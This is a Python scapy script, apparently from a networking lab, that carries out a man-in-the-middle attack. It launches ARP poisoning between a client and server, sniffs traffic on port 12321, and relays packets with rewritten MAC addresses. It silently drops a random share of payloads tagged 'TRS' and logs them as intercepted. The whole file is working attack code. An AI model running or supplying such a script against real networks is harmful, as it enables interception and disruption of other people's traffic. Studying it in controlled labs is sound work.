from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from arp_poisoning import *
import multiprocessing

prev_packet = None

server_mac = get_mac(server_ip)
client_mac = get_mac(client_ip)
mitm_mac = get_mac(adv_ip)


def spoofer(x):
    global prev_packet
    packet_sent_to_mitm = x[Ether].dst == mitm_mac
    if packet_sent_to_mitm and prev_packet != x[IP].id:
        prev_packet = x[IP].id
        if x[Ether].src == client_mac:
            x[Ether].dst = server_mac
        x[Ether].src = mitm_mac
        num = random.randint(1, 10)
        data = x[Raw].load
        data = data.decode("utf-8").split("|")
        if num >= 5 and data[0] == "TRS":
            print("[*] Intercepted packet seq# ", data[4], "\n Packet:", data)
        else:
            sendp(x)
    else:
        return


if __name__ == "__main__":
    arp_poisoning_process = multiprocessing.Process(target=start_poisoning)
    try:
        arp_poisoning_process.start()
        print("[+] Arp poisoning started")
        print("[+] Sniffer started")
        sniff(filter="port 12321", prn=spoofer)
    except KeyboardInterrupt:
        pass
    finally:
        print("[-] Sniffer stopped")
        arp_poisoning_process.kill()
        restore(client_ip, server_ip)
        print("[-] Arp poisoning stopped")
        exit(0)